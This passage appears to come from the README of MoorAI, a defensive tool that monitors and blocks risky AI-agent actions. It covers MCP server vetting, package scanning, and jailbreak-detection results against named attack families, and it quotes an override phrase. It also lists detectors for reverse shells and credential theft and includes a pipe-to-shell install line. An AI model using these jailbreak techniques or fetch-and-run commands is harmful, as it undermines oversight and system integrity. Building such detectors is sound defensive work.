- **AIBOM: running local model servers and local MCP servers.** `moorai-aibom` also reports which local model servers are **running**, not only installed. The probe runs `lsof +c 0 -iTCP -sTCP:LISTEN -nP` + `ps -A -o comm=` on macOS/Linux and `netstat -ano` + `tasklist /FO CSV /NH` on Windows, and keeps only process names and ports; it never reads process arguments or environment. It knows Ollama (process name, or a listener on its documented default port 11434), LM Studio (process name; LM Studio documents no fixed default port), llama.cpp `llama-server` and vLLM (process name; their documented defaults 8080/8000 are too generic to count alone). Each is reported as `{runtime, ports, bind: loopback|network, detectedBy}`. MCP servers declared with a localhost `http(s)` URL in the configs the AIBOM already reads are matched to a listener on that port and reported as `{name, scope, transport: http|sse, port, running}` (`running: null` when the probe could not run). The URL is never echoed, because its query string can carry a token. In `moorai-shadow` these appear as `local-runtime` items (sanction with `sanctioned.runtimes`; a server listening beyond loopback ranks high) and `api-key` items (sanction with `sanctioned.apiKeyHashes`, an exact list of the org's issued keys' `h2:` hashes; `h2:nokey` never sanctions). The desktop host reports both signals to the console too: its device report's `aiAssets` now carries `apiKeysAtRest`, `localRuntimes` and `localMcpListeners` with the same shapes, produced by Rust mirrors of these collectors (`src-tauri/src/ai_keys.rs`, `ai_runtime.rs`, `content_hash.rs`). `test/aibom-rust-parity.test.mjs` pins the Rust tables to the JS ones, and `test/fixtures/content-hash-parity.json` is asserted by both `cargo test` and Node so the host's `keyHash` is byte-identical to the agent's. The console stores them with the rest of `aiAssets` but does not display them yet.
- **AIBOM: local models with safety training removed (by name).** `moorai-aibom` reads local model **names** in memory and reports, per runtime, how many there are and how many have a name that says their safety training was removed, plus one boolean (`localModelSafety`, and `summary.localModelsSafetyRemovedByName`). Names come from Ollama's manifests directory and its `/api/tags` on `127.0.0.1:11434` only (`OLLAMA_HOST` is not followed), LM Studio's and Jan's `<publisher>/<model>` folders, GPT4All's model folder, the llama.cpp `-hf` cache and the Hugging Face hub cache (`models--<org>--<name>`). A model counts when a word of its name is `abliterated`, `obliterated`, `uncensored`, `decensored`, `unaligned`, `jailbroken` or `heretic`. Words are split at separators, case changes and letter/digit changes, so `jailbreak-classifier`, `Llama-Guard`, `heretical` and `aligned` do not match. A name, path, org, tag or digest is never output. The scan stops at 2 s and 5,000 directory entries (1,000 from one directory) and says so (`truncated`, `timedOut`). This is name-based only: it does not prove or disprove a backdoor, and a renamed model is not caught. The source of each token is in `cli/local-model-names.mjs`; tests are in `test/local-model-names.test.mjs`. The desktop host builds the same block (`src-tauri/src/local_model_names.rs`, identical output on the shared fixture `test/fixtures/local-ai/model-names.json`) and sends it with its device report, so the console shows the counts.
- **AIBOM: MCP server reputation.** `moorai-aibom` reports each MCP server's first-seen reputation (`{score, band, reasons}`, a 0-100 score, band good/fair/poor/bad and category codes such as `mcp-typosquat` or `pkg-install-script-remote`), scored offline from the package name and the copy npx already installed, and counts poor and bad servers in `summary.mcpLowReputation`. `moorai-shadow` carries the same reputation, and an unsanctioned server with a poor or bad band ranks high whatever its inferred scope. The scoring, the opt-in registry lookup and feed, and the `blockBelow` policy are documented in [`mcp-proxy/README.md`](mcp-proxy/README.md).
- **`moorai-compliance`** maps the device's existing content-free signals to framework controls and marks each **covered / partial / not-covered honestly** — the evidence layer a cost-pressured SOC can actually keep. `--format stix` emits the findings as a STIX 2.1 bundle (custom `x-moorai-finding` objects + hash-keyed indicators) for threat-intel interchange.
- **`moorai-verify-chain`** walks each on-device evidence log and verifies its prev-hash chain — a deleted, reordered, or in-place-edited record breaks the chain and is reported. Every log line and every emitted OTel span is chain-stamped (`cli/record-chain.mjs`), so the record hash proves each record and the chain proves the *sequence* (immutable once streamed to your SIEM).
- **`moorai-honeytokens`** registers content-free canaries — a decoy value nobody should ever touch; only its one-way hash is stored, and a later hit is a high-signal alert with zero content at rest.
- **`moorai-attest`** emits the governed record chain as an **in-toto attestation / SLSA provenance predicate**, built only from the content-free fields (tool · category · risk · decision · stage · tenant + the one-way hashes + chain seq/prev/chash) — so an agent's action evidence plugs into the software-supply-chain attestation ecosystem without carrying any content. The AIBOM also exports as a standard **CycloneDX 1.6** or **SPDX 2.3** SBOM (`moorai-aibom --format cyclonedx|spdx`).
- **`moorai-receipt`** emits a signed, content-free **per-verdict decision receipt** — a strict-allowlist payload (tool · category · risk · decision · stage · tenant + the one-way hashes + chain seq/prev/chash), a SHA-256 digest bound only to those fields, and an ed25519 signature from the same per-device agency key as the MCP-approval tokens. `moorai-verify-chain --offline <file>` verifies a receipt (or an in-toto attestation) with **no network** — recomputing the digest to reject tampered payloads and checking the signature against a pinned key. Generation is fail-open (a null signer yields a valid unsigned receipt); verification is fail-closed.
- **`moorai-scan`** is a **pre-install skill gate** — MoorAI's on-device, content-free answer to a cloud "skill scanner". Point it at a skill/agent artifact on disk (a directory, a `SKILL.md`, a `.mcp.json`, a `.claude/agents/*.md`, …) *before* you install it and it walks the path, classifies each file's skill-surface kind (`data/skill-surface.js`), and runs MoorAI's **own shipped detection engine** over each text file at stage `file` (and `tool` for JSON MCP configs). The **verdict is derived from the engine's own allow/ask/deny decisions — never an invented 0-100 score**: any `deny` → `DO-NOT-INSTALL`, any `ask` → `REVIEW`, low findings only → `CAUTION`, nothing → `CLEAN` (the worst across all files). No external scanner is bundled or invoked, and **no enrollment is required** (it runs before you install, possibly before you enroll). Output is JSON (or `--format md`) and is **content-free** — per finding only `{relativePath, surfaceKind, threatId, category, intentLabels, contentHash, tier}`, never the matched text or file contents — so it never becomes the exfiltration channel a cloud scanner is. Exit codes slot into CI: `0` for CLEAN/CAUTION, non-zero for REVIEW/DO-NOT-INSTALL, tunable with `--fail-on <tier>`.
- **`moorai-mcp-check <package>`** runs ten pre-install checks on an MCP server from registry metadata and published manifests only; the package is never downloaded or run, and the reputation cache is not written. Each check is pass, warn, fail or not checked, with a one-line reason: (1) publisher identity and typosquat (the name lists and the repository link), (2) package age (`new-package`, under 30 days), (3) maintainers (npm `maintainers`, PyPI `ownership.roles`), (4) npm install scripts from the version manifest, (5) authentication and (7) credential names, both from the `server.json` the package publishes to the official MCP Registry (npm `mcpName`, PyPI `mcp-name:`), (6) a remote endpoint's HTTPS, hostname rather than bare IP, and fit with the policy's `egressRules`, (8) tool descriptions through the tool-stage engine when you pass `--tools <tools/list JSON>`, (9) whether the spec pins a version, and (10) whether this machine routes MCP through MoorAI (hook, stdio proxy or gateway). It also prints a metadata-only reputation score and band, and the SkillTriage verdict when `mcpReputation.feed` is on. Input: `npm:name@1.2.3`, `pypi:name==1.0`, a bare npm name, a launch command (`"npx -y name@1.2.3"`) or an `https://` URL (parsed, never contacted). Policy comes from `--policy file.json`, or the verified policy already on the device (read offline, as `moorai-doctor` does); `--no-policy`; `--json`. Exit 1 if any check fails. **Limits.** PyPI install-time code (setup.py, build backends) is not visible in its JSON API, so that check is not checked for PyPI. Authentication, credentials and transport for a package need a published `server.json`; most packages have none. MCP OAuth is negotiated at connect time and is not probed. The tool list is only known from a running server unless you supply it. An npm semver range is not resolved: install scripts are read from the latest version, and the report says so.

  **Package code (`--packages`, `--package`).** With `--packages`, each MCP server whose config launches a package (`npx`, `pnpm dlx`, `bunx`, `yarn dlx`, `uvx`, `uv tool run`, `pipx run`) is downloaded from the public registry, its digest checked (npm `sha512` integrity, PyPI `sha256`; a mismatch fails closed), extracted into a temporary directory with traversal, link and size guards, and analysed statically — nothing in it is executed. Only the package name and version leave the device, and only with the flag (or `MOORAI_SCAN_PACKAGES=1`); without it the packages are listed as not analysed. Package code gets its own checks — install scripts that download or run remote code, runtime self-install, environment or credential harvesting next to a network send, obfuscated `eval`, socket reverse shells, typosquatted names, known-malicious packages — and the prompt-oriented detectors are scoped by file type: in code and docs they report at most `CAUTION`, because an MCP server spawning processes or calling APIs is expected. `DO-NOT-INSTALL` needs concrete evidence of malicious or unsafe-by-construction behaviour. Docker images and remote-only servers are reported as not analysed.

  **Streamed, so a big package fits in a small container.** The artifact is streamed to a temp file and **hashed while it streams** — the registry digest is still verified end to end, but nothing larger than one archive entry is ever resident. Tarballs are gunzipped through a streaming parser; a zip/wheel is read by offset from the temp file rather than loaded whole. Measured on `npm:n8n-mcp` (a 33 MB tarball, 957 files): **peak RSS 358 MB → 188 MB**, same wall time (~3.9 s). Every temp file is removed in a `finally`, including on an integrity failure or an aborted body. Caps are 128 MB compressed / 512 MB extracted / 10000 entries, each overridable (`MOORAI_SCAN_MAX_ARTIFACT_MB`, `MOORAI_SCAN_MAX_REPO_MB`, `MOORAI_SCAN_MAX_EXTRACT_MB`, `MOORAI_SCAN_MAX_FILE_MB`, `MOORAI_SCAN_MAX_ENTRIES`). An archive over a cap reports `archive-limits-exceeded` and `REVIEW` — an unfinished scan is never reported as a clean one.

  **GitHub source repositories (`--package github:<owner>/<repo>[/<path>][@ref]`).** Many MCP servers are published only as a source repository, with no npm or PyPI package. With a `<path>` this fetches a single skill folder; with **no path it extracts and scans the whole repository**, reporting `ecosystem: "github"`, the resolved commit from the archive's pax header, and `integrity: none` (a git archive carries no registry digest). Only `owner/repo/ref` leaves the device, to `codeload.github.com`. What is not the product is dropped during extraction and never costs a byte of the budget — `.git/`, `node_modules/`, `vendor/`, `.venv/`, `__pycache__/` — while `dist/`, `build/` and `target/` are kept, because checked-in build output ships exactly as a package's `dist/` does. And because a repository carries its tests, examples, docs and its own CI and dev-environment tooling, **block-tier evidence in those paths is reported at `REVIEW` with its path and a `test-code` / `repo-tooling` label, not as a `DO-NOT-INSTALL` verdict** — a published DO-NOT-INSTALL is a public accusation about the product. That rule came from measurement, not taste: `metabase` was a false alarm (a CI test drives git through `pty.spawn`, no socket anywhere) and `posthog` a true `curl … | sh` in an optional developer bootstrap. The same evidence in shipped server code keeps its block tier, pinned by a true-positive twin test.
- **Per-agent behavioral baseline detectors.** On top of the fixed agent signatures, three content-free detectors flag deviation from an actor's *own* established behavior: a **velocity burst** (cadence far above the actor's robust median/IQR), a **confused-deputy pivot** (an injection tell followed by a sensitive action in the same actor's window), and a **fan-out anomaly** (a spawning actor delegating to abnormally many subagents). Features are all hashes/metadata; thresholds are chosen for explainability and not yet tuned against a production distribution.
- **Obfuscation-resistant detection.** A bounded, DoS/ReDoS-capped decode/normalize pre-pass re-runs the detectors over decoded and reversed variants, so **encoded/obfuscated** payloads (base64/hex/rot13/caesar ciphers, reversed text, composed transforms) that defeat plain-text scanning are still caught. All ten HackAgent families — CipherChat, FlipAttack, h4rm3l, DAN, AutoDAN, BoN, AdvPrefix, and the persuasion/multi-turn families **PAP, PAIR, TAP** — are caught by content-free detectors, the last three via a weighted persuasion-tell + crescendo-trajectory analyzer (`data/crescendo.js`). **Measured honestly, and the honest answer depends heavily on how hard the test set is** — we publish both:
  - **Mild paraphrases** (`npm run redteam-eval`, 29 held-out samples, 178-prompt benign corpus): **100% held-out (29/29) at 94% precision (4 FP/178).** Read that as a regression gate, not a generalization claim — a v0.71.0 tuning wave targeted these 29 samples, which burns them as a held-out set. The locked half below is the honest out-of-sample number.
  - **Adversarial mutations** (`node scripts/score-heldout-v2.mjs`, **105 fresh attacks** built by a mutation generator across 29 transformation axes — synonym/voice swaps, directive-in-code-comment/JSON/blockquote indirection, homoglyphs, letter-spacing, caesar/rot13, persona and persuasion recombinations). This set is split into a tune half and a **locked** test half (`scripts/split-heldout-v2.mjs`, stratified by family+axis); detector work may only see the tune half, so the locked half stays a valid measure:

    | | before fixes | after fixes |
    |---|---|---|
    | **Locked test half, deterministic** (never seen during tuning) | 31.8% (14/44) | **86.4% (38/44)** at **100% precision** (0 FP/10) |
    | **Locked test half, full stack** (+ on-device model) | — | **100% (44/44)** at **100% precision** |
    | Tune half | 34.4% (21/61) | 100% (61/61) |

    Precision is measured against a **610-prompt benign corpus** (`test/redteam/benign-corpus-v2.json`, 269 adversarially-shaped hard negatives): **3.32% false-positive rate** (20/602). That rate went **up**, and the reason is the point: 101 deliberately-obfuscated benign samples were added, and before they existed the FP gate could not tell a safe detector apart from one scoring 48 false positives. A harder corpus with a worse number is a better measurement than an easy corpus with a good one.

  The locked half scores **86.4% (38/44)** deterministically and the tune half **100% (61/61)**: that **13.6-point tune/test gap is the overfit margin** — the detectors still fit the phrasings they were tuned on better than fresh ones. Four named overfit root causes — a too-narrow policy-negation vocabulary, a rules-slot that broke on one adjective (`override your safety rules`), no confusable/homoglyph folding, and synonym-blind fuzzy matching — are fixed in the shipped detectors. Weakest on the locked half: TAP (1/3) and PAIR (2/4) by family, and the thought-experiment, leetspeak and multi-turn crescendo axes — those live in the semantic layer, not these detectors. None of this changes the fact that the **action layer** — which blocks the tool call regardless of whether the prompt was ever classified — is the durable control, not prompt detection. An optional **on-device semantic escalation** layer (`--semantic`, a local model, zero egress) recovers most of the residue (~97% held-out in a sampled run) but is opt-in and environment-dependent, so it is not the headline number. `npm run validate-blocking` shows every malicious *tool call* still denied at the hook even after a jailbreak.

### Stream to your SIEM / observability stack — OpenTelemetry, content-free

Point MoorAI at any OTLP collector and every governed decision is exported as an OpenTelemetry span
(GenAI semantic conventions) that Datadog, Dynatrace, Grafana, Elastic, or your SIEM ingest natively —
**but carrying no prompt, response, argument, or file-path content**. Only governance metadata and the
tenant-keyed argument hash leave: `gen_ai.tool.name`, `moorai.category`, `moorai.risk`,
`moorai.decision`, `moorai.args_hash`. A blocked call is an ERROR span, so denials light up in your
existing dashboards. It is the standard telemetry envelope with none of the content — observability you
can pipe into your SIEM without a data-residency problem, and without vendor lock-in.

```bash
export MOORAI_OTLP_ENDPOINT="https://otel-collector.example:4318"   # OTLP/HTTP (JSON) base URL
export MOORAI_OTLP_HEADERS="x-api-key=…"                            # optional ingest headers
```

Off unless an endpoint is set; emission is bounded and best-effort and never affects an enforcement
decision. (Or set `otlpEndpoint` / `otlpHeaders` in the device config.)

### Sandbox egress policies from the same egress rules

The `egressRules` / `egressDefault` that MoorAI's own check judges can also become the network part of a
kernel sandbox's policy, so one rule set drives both layers:

```bash
node cli/sandbox-policy.mjs --target mxc|seatbelt|openshell --rules policy.json
```

The policy goes to stdout. Every rule the target cannot express goes to stderr as
`{ index, id?, action, fields, effect, reason }`; nothing is dropped silently. A sandbox sees connections, not
calls, so:

- **MXC (Windows):** only numeric hosts become rules (`network.egress.allow` / `deny`, `/32` or `/128`).
  `egress.default` stays `deny`. A block wins over the host-only `egressAllow` CIDRs. Hostnames, loopback,
  and the binary, method and path fields stay with MoorAI's check. The desktop host reads the rules from
  `egressRules` / `egressDefault` in `%LOCALAPPDATA%\MoorAI Host\mxc.json`.
- **Seatbelt (macOS):** `sandbox-exec` can only name `localhost` or `*` (measured). `egressDefault: "block"`
  denies all outbound except loopback, and loopback port rules are carried. Every other host is reported.
  The desktop host reads the rules only from a root-owned `/etc/moorai/config.json`.
- **OpenShell:** generates `network_policies` YAML. Binaries become `/**/<name>` and methods and paths
  become REST rules. A MoorAI block that an OpenShell allow would cover either becomes `deny_rules` or
  removes that allow. OpenShell has no connection-level deny.
- **gVisor:** not a target. gVisor has no per-host egress policy; egress comes from the deployment's
  network policy.

Details and limits: [CAPABILITY_SPEC.md](docs/CAPABILITY_SPEC.md#sandbox-egress-policies-from-egressrules).

### Cloud AI platforms (Amazon Bedrock inventory)

`moorai-cloud-inventory bedrock --run --regions us-east-1 --post` reads, read-only, the agents, knowledge
bases, guardrails, custom models, provisioned throughput, application inference profiles and AgentCore
runtimes an AWS account defines on Bedrock, using your own AWS CLI and credentials. Each resource becomes a
content-free record (keyed-hash id, status, coarse attributes, risk flags such as an agent with no
guardrail or with the code interpreter enabled) shown in the console's Inventory view. No names, prompts or
ARNs leave the machine. The device must be enrolled, because the install token keys the hashes. Minimum IAM
policy: `moorai-cloud-inventory bedrock --policy`. It has been tested against the documented response
shapes and a fake AWS CLI only, not yet against a real AWS account. See [`cloud/README.md`](cloud/README.md).

## Coverage

| | |
|---|---|
| **Agents** | Claude Code (full hook enforcement) · **Codex CLI, GitHub Copilot CLI, Gemini CLI and Cursor: pre-tool hook enforcement** through `cli/moorai-agent-hook.mjs` (see *Other agents* below) · Claude Desktop · VS Code / Copilot · any project `.mcp.json` consumer (MCP stdio proxy — **enforcement, host-independently**, but only over MCP; see the bound below) · remote MCP servers (HTTP gateway) · Claude Agent SDK services in process and other agent loops through a localhost sidecar (*Server mode: Agent SDK and sidecar*) · any agent that calls the Anthropic Messages or OpenAI Chat Completions API through an SDK with a configurable base URL (model proxy) |
| **Surfaces** | prompts · AI outputs · files read into context · **files the agent writes or edits** · MCP tool calls · **MCP tool listings and tool results** · **outbound `WebFetch` requests** · **what comes back from `Bash`, `PowerShell`, MCP tools and sub-agents (Claude Code)** · pasted images (on-device OCR) · the agent's auto-loaded context files (`CLAUDE.md`, `AGENTS.md`, `.mcp.json`, …) · **content an app is about to embed into a vector store (SDK, sidecar) and MCP vector-store writes** · the agent's auto-loaded skill surface (skills, subagents, commands, MCP configs, hook-bearing settings) · **the session as a whole: failed tool calls, the agent's end-of-turn claim, compactions (Claude Code)** · **model calls: what an agent sends to the provider and the tool calls the model returns (model proxy)** |
| **Platforms** | macOS · Windows · Linux (on-device OCR is a second-class tier — see below) |
| **Detects** | secrets · PII / PHI · source-code leakage · prompt injection · destructive commands · second-order/hidden-instruction injection · skill-surface poisoning & drift · the agent's rules files leaving the device · risky actions outside the user's stated task · low-reputation MCP servers · MCP tool descriptions that ask for a credential file · outbound actions after untrusted content, multi-step and slow exfiltration · runaway loops · success claims over failed tool calls · agents running without MoorAI's hook or with weakened settings · agents running a host version MoorAI's adapter was not tested against |

**Memory and knowledge-base poisoning (#22, #21).** An agent writing an instruction into its own memory —
Claude Code auto-memory, `CLAUDE.md`, Codex `AGENTS.md`, Cursor / Windsurf / Cline / Copilot rules, skills —
through `Write` / `Edit` or a shell `echo >>` / `tee` / heredoc raises #22 when the text would send data out,
hide something from you, skip a check or override its rules in future sessions; the same check runs on those
files when they are auto-loaded at session start. Content headed into a knowledge base or vector index
(`scanBeforeEmbed`, `POST /v1/index-scan`, MCP vector-store writes) raises #21 when it addresses the model that
will retrieve it, suppresses the other sources or carries hidden instructions. Factual poisoning with no
instruction in it is not detected. Design and measurements: [`docs/DETECTION_ENGINE.md`](docs/DETECTION_ENGINE.md) §2.

**NSFW content is reported and coached by default.** With no org setting, the sexual, violence and profanity
content categories run in `notify`: the console gets the finding and the person sees it, and nothing is
blocked. An org can turn each off, or make it `justify` / `block`, from the console. The other content
categories (self-harm, drugs, eating disorders, hate, harassment, grooming) stay off until an org turns them on.

**Coverage layers.** MoorAI sees agent activity through three layers, each independent of the others.

- **Hooks: the deepest view, tied to each host's format.** In Claude Code, Codex, Copilot CLI, Cursor and
  Gemini CLI, MoorAI's hook runs inside the host and sees each tool call before it runs (the shell
  command, the file being written, the MCP arguments, the prompt), and can deny it. Each adapter in
  [`cli/agent-hooks/`](cli/agent-hooks) translates that host's hook payload into one shape, so a hook works
  only while the host keeps the payload fields, event names and answer format the adapter was written for.
- **MCP gateway and model proxy: client-independent.** The HTTP gateway ([`mcp-gateway/`](mcp-gateway)) and
  the stdio proxy see every MCP tool call and result routed through them; the model proxy
  ([`model-proxy/`](model-proxy)) sees what an agent sends to the provider and the tool calls the model sends
  back. Neither depends on which client is calling or on its hook format. If a host changes its hook
  format, MoorAI loses the per-tool view in that host, not MCP or model traffic that goes through the
  gateway or proxy: coverage degrades, it does not disappear.
- **Keeping the hook layer current.** The nightly drift job and runtime host-version reporting (*Keeping
  up with the agent hosts* below) shorten the gap between a host release and an adapter update. Neither
  prevents it: until the adapter is fixed, that host's hook layer is reported as untested, and the gateway
  and proxy layers still cover MCP and model traffic.

**The bound on host-independent enforcement, stated plainly.** The MCP proxy enforces on any host that
launches a stdio MCP server, in both directions — but MCP is one wire. Measured against a 12-action
malicious set, the proxy refused **12/12** while enforcing (8 by the argument scan, **2 by the result
scan**) and forwarded **4/4** benign actions — yet only **4 of those 12 actions natively traverse MCP at
all**. The other eight reach the machine through a host's own built-in tools, where the Claude Code
PreToolUse hook is the control and the proxy sees nothing. So "host-independent" is true of the mechanism
and narrow in reach; full coverage is still a Claude Code property.

**Remote MCP servers.** A remote (Streamable HTTP / SSE) MCP server has no process to wrap.
`moorai-mcp-gateway --route /name=https://remote.example/mcp` (or `--config gateway.json`) is a local
reverse proxy in front of one or more of them that applies the stdio proxy's tool-call and tool-result
checks. A refused call comes back as an MCP tool result with `isError: true` (HTTP 200), not a JSON-RPC
error. Both MCP spec eras' headers pass through (revision 2026-07-28 removed sessions and GET streams).
It also hardens the wire itself:

- **Staged message validation** (`--schema enforce`, the default; `report` or `off`): every POST body and
  every response is checked as JSON, JSON-RPC 2.0, MCP structure, a known method, the protocol version and
  the `initialize` / `tools/list` / `tools/call` schemas. An invalid client message is refused (an unknown
  method is forwarded and reported unless `--allow-method` lists the allowed ones) and an invalid
  `tools/call` result is replaced by a tool error; the alert is `SCHEMA_INVALID` with the stage and
  a JSON path built from the schema's own field names, never a value the peer sent.
- **Response size cap** (`--max-response-bytes`, 4 MiB by default, `0` = off): a JSON response or one SSE
  event over it is not relayed (`RESPONSE_TOO_LARGE`).
- **Per-client cool-down** (`--cooldown-refusals N`, off by default): after N refusals in a window, that
  client's requests are refused for a while (`CLIENT_COOLDOWN`). It is off because on the default loopback
  bind every local client shares one address; turn it on where clients send their own `Authorization`.
- **Placeholder credentials** (`--credentials <file>`, opt-in): the MCP client holds `moorai-ph:<name>`
  instead of the token, and the gateway swaps the real token in only on the bound route. The limits are the
  model proxy's: see [`mcp-gateway/README.md`](mcp-gateway/README.md#placeholder-credentials).
- **Declared workload profiles** on every `tools/call`, the tool named `mcp__<route>__<tool>` as the hook
  names it (`PROFILE_DRIFT`, kinds `tool` and `mcpServer`).

The gateway adds about 4.7–5 ms at p50 against an in-process fake upstream, unchanged by these checks. It
is covered by 98 tests against a fake upstream and a fake console, server-mode identity and profile blocks
included, and it has been run against a real remote MCP server (an AppCrane MCP endpoint over Streamable HTTP: initialize, tools/list with 62 tools and a read-only tools/call passed through intact; a malformed message and an over-cap response were refused).

**Real MCP clients (measured 2026-10-06, macOS).** Four real MCP clients have completed the handshake
through the gateway and through the stdio proxy, against the fake server: Claude Code 2.1.284,
cursor-agent, the official TypeScript SDK client (`@modelcontextprotocol/sdk` 1.32.1) and the MCP
Inspector 2.9.0 CLI. Each listed the fake server's tools, and through the gateway each carried the
server's `Mcp-Session-Id` on its later requests. When the gateway's method allow-list refused
`tools/list`, every client showed MoorAI's refusal. With no model, the SDK and the Inspector each made a
benign `tools/call` (forwarded and echoed) and a policy-denied one (refused; the server never received
it) through both pieces. In three live Claude Code runs (`claude -p`, Haiku), the model called the fake
server's tool: a benign call through the stdio proxy and one through the gateway were forwarded and
recorded, and a call with a policy-denied argument through the stdio proxy came back to the model as
MoorAI's refusal and never reached the server. Not yet tested: Claude Desktop, VS Code or Cursor's
desktop app; Windows or Linux; OAuth discovery through the gateway; a real client and a real remote
server in the same run (so no session id issued by a real remote server); a live model call with a
denied argument through the gateway; a completed 2026-07-28 (modern-era) session with a real client.

```bash
node scripts/mcp-client-matrix.mjs                     # every installed client × stdio proxy and gateway, no model call
MOORAI_LIVE_MCP=1 node --test --import ./test/hermetic-env.mjs test/mcp-live-client.test.mjs   # the same checks, as 17 opt-in tests
node scripts/mcp-live-toolcall.mjs                     # live tier: prints the plan; --run spends 3 claude -p turns
```

Details: [`mcp-gateway/README.md`](mcp-gateway/README.md) and [`mcp-proxy/README.md`](mcp-proxy/README.md).

**Proxy and hook cross-check each other.** The agent hook and the stdio MCP proxy each count MCP
calls per server label per day, content-free, and post each completed day once to the console
(`POST /api/mcp-usage`, path `hook` or `proxy`). The console compares the two per device, day, host and
server: MCP traffic one path sees and the other does not shows a bypass or a coverage gap. Server labels are
sent in clear, as the action audit already carries them. Details:
[`mcp-proxy/README.md`](mcp-proxy/README.md).

**Gateway usage.** The HTTP gateway posts the same daily counts with path `gateway`, and per tool as well:
each server entry carries the tool names as called with their counts (the 64 busiest per server, with
`toolsTruncated` when there were more). Names and counts only, never arguments or results; in server mode
the identity is user `service`, device `svc:<serviceId>`. The console's MCP map (console v0.73.0) shows
them. Measured end to end against a real local console: six calls arrived with exact per-tool counts and
complete tool detail, and no argument text reached the console.

### Keeping up with the agent hosts

MoorAI hooks into five hosts, and each changes its hook interface on its own release schedule.
[`data/host-versions.json`](data/host-versions.json) is the single record of which version of each host the
adapter was last tested against:

| Host | Tested version |
|---|---|
| Claude Code | 2.1.284 |
| Codex | 0.154.0 |
| Copilot CLI | 1.0.63 |
| Cursor (`cursor-agent`) | 2026.05.27-fe9a6e2 |
| Gemini CLI | 0.60.0 |

```bash
node scripts/host-drift.mjs                           # every host, against whatever is installed locally
node scripts/host-drift.mjs --host codex --latest     # also ask npm for the latest release
node scripts/host-drift.mjs --installed gemini=0.63.0 --skip-tests   # check a version you don't have installed
```

- **What the drift check does.** For each host, [`scripts/host-drift.mjs`](scripts/host-drift.mjs) compares the
  installed version (or npm's latest, with `--latest`) with the tested one and reports `same`, `newer`,
  `older` or `unknown`; runs that adapter's conformance tests; and runs one no-model smoke check:
  - **Codex:** fetches the hook JSON schemas Codex publishes for that release tag
    (`codex-rs/hooks/schema/generated/`) and checks that the PreToolUse and UserPromptSubmit input schemas
    still have every field the adapter reads, that the output schema still accepts
    `permissionDecision: "deny"` with a reason, `additionalContext` and `systemMessage`, and that the
    conformance fixture still validates.
  - **Gemini CLI:** installs MoorAI's hooks into a throwaway home and validates the resulting
    `settings.json` `hooks` section against that release's published `schemas/settings.schema.json`.
  - **Cursor:** checks that the installed `cursor-agent` bundle still contains the hook events MoorAI
    registers and the `CURSOR_VERSION` / `cursor_version` fields.
  - **Claude Code:** installs MoorAI's hooks into a throwaway config and starts one headless session whose
    model endpoint is a dead local port, so no model is called; checks that command hooks still fire with
    the fields the hook reads, and that `AI_AGENT` still carries the version `claude --version` prints.
  - **Copilot CLI:** none. Copilot publishes no hook schema and its bundle is not readable JS after 1.0.63,
    so only the conformance tests run.

  It writes a JSON report and exits 1 when a check fails.
- **Nightly in CI** ([`.github/workflows/host-drift.yml`](.github/workflows/host-drift.yml)). The job installs
  each host's latest release fresh (Claude Code, Codex, Copilot CLI and Gemini CLI from npm; Cursor through
  `curl https://cursor.com/install -fsS | bash`) and runs the drift check. If a host moved past its tested
  version, a check failed or the install failed, it opens one GitHub issue titled `Host drift: <host>`, or
  updates it if it is already open. An optional live tier runs one real agent turn per host, only when that
  host's API key secret is configured (Codex has none: its user-layer hooks run only after the user trusts
  them, and MoorAI does not forge that trust). **Status:** the workflow has not run on GitHub yet, and no
  live-tier secret exists, so every live entry logs "skipped": no live agent turn has run through the
  Codex, Copilot, Cursor or Gemini adapter.
- **What clears an issue.** When the checks pass on the new version, bump `tested` in
  `data/host-versions.json` and close the issue.

**Host version in the posture heartbeat.** Every host entry in the daily posture heartbeat (*Coverage
integrity* above) carries `version` (the host's version, or `null` when it cannot be determined) and
`tested` (`true` only when that version is the one in `data/host-versions.json`; an unknown version is
`false`). The version comes from the first source that gives one: the env var the calling host sets for
its hooks (Claude Code's `AI_AGENT`, Cursor's `CURSOR_VERSION`); where the host's binary is installed (a
native installer's `versions/<v>/` directory, or the npm package's `package.json`); and, last, one
`<host> --version` run by the daily heartbeat worker and cached until the binary changes. The hook never
runs a host binary while deciding a verdict, and verdicts are unchanged. Only a version string (digits,
dots and a short build suffix) leaves the device. The console drops both fields on ingest today; console
v0.73.0, in progress, is the release that keeps them.

### Image inspection (#23) — where the OCR runs

A pasted screenshot is text as far as policy is concerned, so MoorAI recovers the text and runs it
through the same detectors as any pasted file. That extraction uses **the operating system's own
text-recognition engine**: no model is bundled into the installer, and the image never reaches the
MoorAI console. Honest platform matrix:

| Platform | Engine | Does the image leave the device? |
|---|---|---|
| macOS | `Vision.framework` (`VNRecognizeTextRequest`) — ships with the OS | **No.** Fully on-device. |
| Windows | `Windows.Media.Ocr.OcrEngine` — ships with the OS, needs an OCR **language pack** for a profile language | **No.** Fully on-device. |
| Linux | `Tesseract` via the `leptess` binding (system `libtesseract`, pulled in as a `.deb`/`.rpm` dependency) — **opportunistic, second-class** vs the OS engines | **No.** Fully on-device. |
| Windows with no OCR language pack, or the app opened in a plain browser | none | See below. |

Where the OS provides no engine, MoorAI does **not** fall back to its own servers. If — and only if
— the device already holds an AI provider key (`ANTHROPIC_API_KEY`, the admin key file at
`~/.moorai/provider-key`, or the agent token saved in MoorAI; the same resolution as
[`data/device-inference.mjs`](data/device-inference.mjs)), the app offers a fallback that sends the
image **device → provider directly**, to the provider the developer's own agent already talks to.
That path is disclosed in the UI before it runs and emits a content-free alert so it is visible in
the console. With no engine **and** no key, image inspection is **skipped** and says so — it never
degrades into silent egress.

On macOS the image gets two Vision passes, accurate and then fast, and a fast-pass line the accurate pass
did not produce is added to the text. On macOS 27 the accurate recognizer misreads some characters in
secrets (the `7` in `AKIAIOSFODNN7EXAMPLE` comes back as `Z`), and the fast one reads it correctly.
Measured on 224 rendered secrets: detected 212 → 219, read exactly 157 → 161, at about 20 ms more per
image. When the two passes disagree, one image can show two finding cards for the same key.

> The Windows engine is runtime-verified on a real Windows 11 host — `Windows.Media.Ocr` read back
> 8/8 sensitive strings (incl. an AWS key and an SSN) off a clean render. The Linux/Tesseract tier is
> validated end-to-end but **second-class**: accuracy on dense secret strings is below the macOS/Windows
> OS engines, so treat it as opportunistic, not parity.

### Windows: the JS agent

- **Exit after a console call.** On Windows (Node 24), `process.exit()` right after `fetch()` aborted the
  process with `0xC0000409` and the libuv assert `src\win\async.c, line 76`. Up to v1.9.0 that hit the
  hook on every flagged call of an enrolled device, and the `claude -p` guard when it aborted an enrolled
  prompt. The decision was already made, but the host saw a crash. The hook, the guard, the MCP proxy
